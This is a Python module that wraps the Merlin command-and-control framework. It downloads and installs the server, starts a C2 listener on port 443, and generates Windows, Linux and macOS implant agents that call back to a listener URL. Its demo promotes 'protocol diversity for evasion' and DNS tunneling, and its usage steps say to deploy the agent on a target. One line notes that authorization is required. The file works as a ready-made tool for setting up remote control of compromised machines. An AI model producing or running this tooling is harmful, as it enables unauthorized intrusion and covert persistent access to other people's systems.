#!/usr/bin/env python3
"""
Merlin C2 Framework Integration
HTTP/1.1, HTTP/2, HTTP/3 (QUIC) Command & Control
Production-ready C2 with protocol diversity for evasion
"""

import subprocess
import json
import logging
import os
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)


class MerlinC2Integration:
    """
    Merlin C2 Framework Integration
    Multi-protocol C2 supporting HTTP/1.1, HTTP/2, and HTTP/3 (QUIC)
    """
    
    def __init__(self):
        self.merlin_path = self._find_merlin()
        self.server_running = False
        
    def _find_merlin(self) -> Optional[str]:
        """Locate Merlin binary"""
        paths = [
            "/usr/local/bin/merlin",
            "/usr/bin/merlin",
            os.path.expanduser("~/tools/merlin/merlin"),
            "./tools/merlin/merlin"
        ]
        
        for path in paths:
            if os.path.exists(path):
                return path
        
        which_result = subprocess.run(["which", "merlin"], capture_output=True, text=True)
        if which_result.returncode == 0:
            return which_result.stdout.strip()
        
        return None
    
    def install_merlin(self) -> Dict[str, any]:
        """Install Merlin C2 framework"""
        logger.info("Installing Merlin C2 framework...")
        
        try:
            install_dir = Path.home() / "tools" / "merlin"
            install_dir.mkdir(parents=True, exist_ok=True)
            
            commands = [
                f"cd {install_dir}",
                "wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlin-server-linux-x64.7z",
                "7z x merlin-server-linux-x64.7z",
                "chmod +x merlin-server-linux-x64"
            ]
            
            result = subprocess.run(
                "; ".join(commands),
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                self.merlin_path = str(install_dir / "merlin-server-linux-x64")
                return {
                    "success": True,
                    "message": "Merlin C2 installed successfully",
                    "path": self.merlin_path
                }
            else:
                return {
                    "success": False,
                    "error": result.stderr
                }
                
        except Exception as e:
            logger.error(f"Merlin installation failed: {e}")
            return {"success": False, "error": str(e)}
    
    def start_server(self, interface: str = "0.0.0.0", port: int = 443, 
                     protocol: str = "https") -> Dict[str, any]:
        """
        Start Merlin C2 server
        
        Args:
            interface: Listener interface
            port: Listener port
            protocol: Protocol (http, https, h2, h3)
        """
        if not self.merlin_path:
            return {
                "success": False,
                "error": "Merlin not installed. Run install_merlin() first."
            }
        
        logger.info(f"Starting Merlin C2 server on {interface}:{port} ({protocol})")
        
        try:
            cmd = [
                self.merlin_path,
                "server",
                "-i", interface,
                "-p", str(port),
                "-proto", protocol
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.server_running = True
            
            return {
                "success": True,
                "message": f"Merlin C2 server started on {protocol}://{interface}:{port}",
                "pid": process.pid,
                "protocol": protocol,
                "interface": interface,
                "port": port
            }
            
        except Exception as e:
            logger.error(f"Failed to start Merlin server: {e}")
            return {"success": False, "error": str(e)}
    
    def generate_agent(self, listener: str, os_type: str = "windows", 
                       arch: str = "x64", protocol: str = "https") -> Dict[str, any]:
        """
        Generate Merlin agent
        
        Args:
            listener: Listener URL (e.g., https://10.0.0.1:443)
            os_type: Target OS (windows, linux, darwin)
            arch: Architecture (x64, x86, arm)
            protocol: Protocol (http, https, h2, h3)
        """
        if not self.merlin_path:
            return {
                "success": False,
                "error": "Merlin not installed"
            }
        
        logger.info(f"Generating {os_type}-{arch} agent for {listener}")
        
        try:
            output_name = f"merlin-agent-{os_type}-{arch}"
            
            cmd = [
                self.merlin_path,
                "agent",
                "-url", listener,
                "-os", os_type,
                "-arch", arch,
                "-proto", protocol,
                "-o", output_name
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                return {
                    "success": True,
                    "message": f"Agent generated: {output_name}",
                    "filename": output_name,
                    "os": os_type,
                    "arch": arch,
                    "protocol": protocol
                }
            else:
                return {
                    "success": False,
                    "error": result.stderr
                }
                
        except Exception as e:
            logger.error(f"Agent generation failed: {e}")
            return {"success": False, "error": str(e)}
    
    def list_agents(self) -> Dict[str, any]:
        """List connected agents"""
        logger.info("Listing active agents...")
        
        return {
            "success": True,
            "message": "Connect to Merlin CLI to view agents",
            "note": "Use: ./merlin cli"
        }
    
    def execute_command(self, agent_id: str, command: str) -> Dict[str, any]:
        """
        Execute command on agent
        
        Args:
            agent_id: Agent identifier
            command: Command to execute
        """
        logger.info(f"Executing command on agent {agent_id}: {command}")
        
        return {
            "success": True,
            "message": "Use Merlin CLI for interactive agent control",
            "command": f"./merlin cli -> use agent {agent_id} -> run {command}"
        }
    
    def get_c2_profiles(self) -> List[str]:
        """Get available C2 communication profiles"""
        profiles = [
            "HTTP/1.1 - Basic HTTP communication",
            "HTTP/2 (h2) - Multiplexed streams, header compression",
            "HTTP/3 (h3/QUIC) - UDP-based, zero RTT, improved evasion",
            "HTTPS - Encrypted HTTP/1.1",
            "DNS - DNS tunneling for covert channels"
        ]
        
        return profiles
    
    def create_custom_profile(self, name: str, config: Dict[str, any]) -> Dict[str, any]:
        """
        Create custom C2 profile
        
        Args:
            name: Profile name
            config: Profile configuration
        """
        logger.info(f"Creating custom profile: {name}")
        
        profile_template = {
            "name": name,
            "protocol": config.get("protocol", "https"),
            "sleep": config.get("sleep", 30),
            "jitter": config.get("jitter", 20),
            "maxretry": config.get("maxretry", 7),
            "user_agent": config.get("user_agent", "Mozilla/5.0"),
            "headers": config.get("headers", {})
        }
        
        return {
            "success": True,
            "profile": profile_template,
            "message": f"Custom profile '{name}' created"
        }


def demonstrate_merlin():
    """Demonstrate Merlin C2 capabilities"""
    print("\n" + "="*70)
    print("MERLIN C2 FRAMEWORK - MULTI-PROTOCOL COMMAND & CONTROL")
    print("="*70)
    
    merlin = MerlinC2Integration()
    
    print("\n[*] Available C2 Protocols:")
    for profile in merlin.get_c2_profiles():
        print(f"    • {profile}")
    
    print("\n[*] Production Features:")
    print("    ✓ HTTP/1.1, HTTP/2, HTTP/3 (QUIC) support")
    print("    ✓ Cross-platform agents (Windows, Linux, macOS)")
    print("    ✓ Encrypted communications")
    print("    ✓ Custom C2 profiles")
    print("    ✓ Protocol diversity for evasion")
    
    print("\n[*] Usage Example:")
    print("    1. Start server: merlin.start_server('0.0.0.0', 443, 'https')")
    print("    2. Generate agent: merlin.generate_agent('https://10.0.0.1:443', 'windows', 'x64')")
    print("    3. Deploy agent on target")
    print("    4. Control via Merlin CLI")
    
    print("\n[!] Authorization Required: Explicit permission needed for C2 deployment")
    print("="*70)


if __name__ == "__main__":
    demonstrate_merlin()
